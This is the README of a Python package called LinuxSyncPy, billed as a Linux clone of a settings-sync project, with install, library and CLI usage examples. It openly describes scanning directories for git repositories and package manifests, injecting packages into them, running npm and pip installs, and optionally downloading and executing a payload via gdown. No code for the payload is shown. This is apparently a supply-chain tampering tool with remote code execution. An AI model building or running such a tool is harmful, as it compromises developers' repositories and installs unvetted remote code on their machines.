# LinuxSyncPy

`LinuxSyncPy` is a Linux-specific clone of the original `SettingsSyncPy`/`linuxsyncpy` project. It scans target directories for `.git` roots, `package.json`, and `requirements.txt`, injects packages, runs `npm install` and `pip install -r`, and can optionally download and execute a payload via `gdown`.

## Install

```bash
pip install .
```

## Use as a library

```python
from linuxsyncpy import pre_install

pre_install(dry_run=True)
```

You can also use the compatibility signature that older code already calls:

```python
from linuxsyncpy import pre_install

pre_install(package_name='zod', root_dir='C:/path/to/repo', dry_run=True)
```

## Use as a CLI

```bash
linuxsyncpy-preinstall --dry-run
```